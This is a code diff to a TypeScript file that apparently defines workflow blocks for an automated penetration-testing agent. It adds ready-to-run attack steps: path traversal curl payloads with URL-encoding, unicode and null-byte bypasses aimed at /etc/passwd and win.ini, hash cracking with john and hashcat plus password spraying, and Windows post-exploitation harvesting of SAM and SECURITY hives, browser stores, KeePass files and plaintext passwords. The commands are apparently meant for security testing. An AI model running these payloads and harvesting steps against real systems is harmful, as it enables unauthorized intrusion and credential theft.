@@ -85,14 +85,16 @@ export const PRIVESC_BLOCK: BlockDef = {
 
 export const CRED_CRACK_BLOCK: BlockDef = {
   name: "Credential Cracking",
-  description: "Hash cracking and password spraying workflow.",
+  description: "Hash cracking and password spraying workflow with optimization fast-path.",
   inputSchema: { hashes: "string" },
   outputSchema: { cracked: "string[]" },
   nodes: [
-    { key: "cred.identify", title: "Identify hash type", type: "judgment", description: "Identify hash format (md5, sha1, bcrypt, NTLM, etc.) and save to /tmp/hashes.txt.", priority: 5 },
-    { key: "cred.john", title: "John the Ripper", type: "mechanical", command: "pk exec -- john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt", dependsOn: ["cred.identify"], priority: 10 },
-    { key: "cred.hashcat", title: "Hashcat (if john fails)", type: "mechanical", command: "pk exec -- hashcat -m 0 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt --force", dependsOn: ["cred.john"], priority: 15, optional: true },
-    { key: "cred.spray", title: "Password spray", type: "judgment", description: "Try cracked passwords against all discovered services and users.", dependsOn: ["cred.identify"], priority: 12 },
+    { key: "cred.identify", title: "Identify hash type", type: "judgment", description: "Identify hash format (md5, sha1, bcrypt, NTLM, PBKDF2, etc.) with hashid or hash-identifier. Save to /tmp/hashes.txt. Note the correct hashcat -m mode.", priority: 5 },
+    { key: "cred.online_lookup", title: "Online hash lookup", type: "judgment", description: "For unsalted hashes (NTLM, MD5, SHA1): try online lookups first (ntlm.pw, CrackStation) before spending time on local cracking.", dependsOn: ["cred.identify"], priority: 7 },
+    { key: "cred.optimize_wordlist", title: "Optimize wordlist", type: "judgment", description: "Check password policy (minimum length, complexity). Trim wordlist to match: grep -E '^.{N,}$' rockyou.txt > trimmed.txt. A 20-char minimum reduces 14M entries to 46K. Also try CeWL-generated wordlists from the target's web content.", dependsOn: ["cred.identify"], priority: 8 },
+    { key: "cred.john", title: "John the Ripper", type: "mechanical", command: "pk exec -- john --wordlist=/tmp/trimmed.txt /tmp/hashes.txt", dependsOn: ["cred.online_lookup", "cred.optimize_wordlist"], priority: 10 },
+    { key: "cred.hashcat", title: "Hashcat (if john fails)", type: "judgment", description: "Use hashcat with correct -m mode. Prefer host GPU if available (pk crack --host). Fall back to --force for CPU-only containers.", dependsOn: ["cred.john"], priority: 15, optional: true },
+    { key: "cred.spray", title: "Password spray", type: "judgment", description: "Try cracked passwords against all discovered services and users.", dependsOn: ["cred.online_lookup", "cred.optimize_wordlist"], priority: 12 },
   ],
 };
 
@@ -110,9 +112,56 @@ export const LATERAL_MOVEMENT_BLOCK: BlockDef = {
   ],
 };
 
+export const PATH_TRAVERSAL_BLOCK: BlockDef = {
+  name: "Path Traversal Testing",
+  description: "Systematic path traversal testing with encoding bypasses for file download/upload endpoints.",
+  inputSchema: { url: "string", param: "string" },
+  outputSchema: { vulnerable: "boolean", payload: "string" },
+  nodes: [
+    { key: "path_trav.identify", title: "Identify file operation endpoints", type: "judgment", description: "Find endpoints that accept file paths, hashes, or filenames: download, upload, read, include, template, export, import, attachment endpoints.", priority: 5 },
+    { key: "path_trav.plain", title: "Test plain traversal", type: "judgment", command: "pk exec -- curl -sk '{url}/../../../etc/passwd'", dependsOn: ["path_trav.identify"], description: "Test plain ../ and ..\\ traversal. Try /etc/passwd (Linux) and \\windows\\win.ini (Windows).", priority: 10 },
+    { key: "path_trav.single_encode", title: "Test single URL-encoded", type: "judgment", command: "pk exec -- curl -sk '{url}/%2e%2e/%2e%2e/%2e%2e/etc/passwd'", dependsOn: ["path_trav.plain"], description: "Test single URL-encoded: %2e%2e%2f (../), %2e%2e%5c (..\\.)", priority: 15 },
+    { key: "path_trav.double_encode", title: "Test double URL-encoded", type: "judgment", command: "pk exec -- curl -sk '{url}/%252e%252e/%252e%252e/etc/passwd'", dependsOn: ["path_trav.single_encode"], description: "Test double URL-encoded: %252e%252e%252f, %252e%252e%255c. This bypasses servers that decode once then check.", priority: 20 },
+    { key: "path_trav.unicode", title: "Test unicode normalization", type: "judgment", command: "pk exec -- curl -sk '{url}/..%5c..%5c..%5cwindows%5cwin.ini'", dependsOn: ["path_trav.double_encode"], description: "Test unicode/mixed encoding: ..%5c (backslash), ..%c0%af (overlong UTF-8), ..%ef%bc%8f (fullwidth /). Try both forward and backslash variants.", priority: 25 },
+    { key: "path_trav.null_byte", title: "Test null byte injection", type: "judgment", command: "pk exec -- curl -sk '{url}/../../etc/passwd%00.png'", dependsOn: ["path_trav.unicode"], description: "Test null byte truncation: append %00 before expected extension to bypass extension checks.", priority: 30 },
+  ],
+};
+
+export const WINDOWS_FORENSICS_BLOCK: BlockDef = {
+  name: "Windows Forensics",
+  description: "Post-exploitation Windows artifact collection: registry hives, credential stores, user activity.",
+  inputSchema: { host: "string" },
+  outputSchema: { artifacts: "string[]", credentials: "string[]" },
+  nodes: [
+    { key: "win_forensics.ntuser", title: "Download ntuser.dat", type: "judgment", description: "Download NTUSER.DAT from each user profile: C:\\Users\\<user>\\NTUSER.DAT. Parse with regipy or regripper for RecentDocs, TypedPaths, UserAssist, MRU lists, RunMRU.", priority: 5 },
+    { key: "win_forensics.registry_hives", title: "Collect registry hives", type: "judgment", description: "If SYSTEM-level access: download SAM, SECURITY, SYSTEM from C:\\Windows\\System32\\config\\. Extract with secretsdump or reg save. Contains local account hashes and LSA secrets.", dependsOn: ["win_forensics.ntuser"], priority: 10 },
+    { key: "win_forensics.credential_stores", title: "Check credential stores", type: "judgment", description: "Search for: KeePass databases (.kdbx), browser profiles (Chrome/Firefox/Edge credential stores), PuTTY saved sessions (registry), WinSCP stored passwords, RDP .rdp files with passwords, Wi-Fi profiles (netsh wlan export).", dependsOn: ["win_forensics.ntuser"], priority: 10 },
+    { key: "win_forensics.interesting_files", title: "Interesting files checklist", type: "judgment", description: "Search for: .lnk files (recently accessed files, may reveal paths), desktop.ini, unattend.xml/sysprep.xml (plaintext passwords), web.config/appsettings.json (.NET configs), PowerShell history (ConsoleHost_history.txt), .git directories, backup archives (.zip/.7z/.bak).", dependsOn: ["win_forensics.ntuser"], priority: 15 },
+    { key: "win_forensics.parse_artifacts", title: "Parse and extract", type: "judgment", description: "Parse collected artifacts with available tools. Use regipy for registry hives, keepass2john + john for .kdbx files, strings/grep for plaintext credentials in configs. Log all credentials as artifacts with pk artifact add.", dependsOn: ["win_forensics.registry_hives", "win_forensics.credential_stores", "win_forensics.interesting_files"], priority: 20 },
+  ],
+};
+
+export const WEB_ATTACK_SURFACE_BLOCK: BlockDef = {
+  name: "Web Attack Surface",
+  description: "Systematic web app vulnerability checklist: IDOR, traversal, encoding bypass, upload abuse, auth bypass.",
+  inputSchema: { url: "string" },
+  outputSchema: { findings: "string[]" },
+  nodes: [
+    { key: "web_attack.map", title: "Map endpoints and parameters", type: "judgment", description: "List all discovered endpoints, parameters, and input fields. Note which accept file paths, IDs, URLs, or file uploads.", priority: 5 },
+    { key: "web_attack.idor", title: "Test for IDOR", type: "judgment", description: "For endpoints with IDs: increment/decrement numeric IDs, swap UUIDs, access other users' resources. Test both authenticated and unauthenticated.", dependsOn: ["web_attack.map"], priority: 10 },
+    { key: "web_attack.traversal", title: "Test path traversal", type: "judgment", nodeType: "block_ref", blockRef: "Path Traversal Testing", description: "Run the path traversal block against file operation endpoints.", dependsOn: ["web_attack.map"], priority: 10 },
+    { key: "web_attack.auth_bypass", title: "Test auth bypass", type: "judgment", description: "Access endpoints without tokens, with expired tokens, with other users' tokens. Test HTTP verb tampering (GET vs POST vs PUT). Check for 403 bypass via headers (X-Forwarded-For, X-Original-URL).", dependsOn: ["web_attack.map"], priority: 15 },
+    { key: "web_attack.upload", title: "Test file upload abuse", type: "judgment", description: "If upload exists: double extensions (.php.jpg), null bytes (.php%00.jpg), content-type manipulation, magic byte spoofing, SVG with embedded script, polyglot files.", dependsOn: ["web_attack.map"], condition: "endpoints.has_upload", priority: 15, optional: true },
+    { key: "web_attack.error_disclosure", title: "Test error disclosure", type: "judgment", description: "Trigger errors: invalid input types, oversized input, special characters, missing parameters. Check for stack traces, internal paths, version info, database errors.", dependsOn: ["web_attack.map"], priority: 20 },
+  ],
+};
+
 export const BUILTIN_BLOCKS: BlockDef[] = [
   WEB_RECON_BLOCK,
   PRIVESC_BLOCK,
   CRED_CRACK_BLOCK,
   LATERAL_MOVEMENT_BLOCK,
+  PATH_TRAVERSAL_BLOCK,
+  WINDOWS_FORENSICS_BLOCK,
+  WEB_ATTACK_SURFACE_BLOCK,
 ].map(withStartEnd);
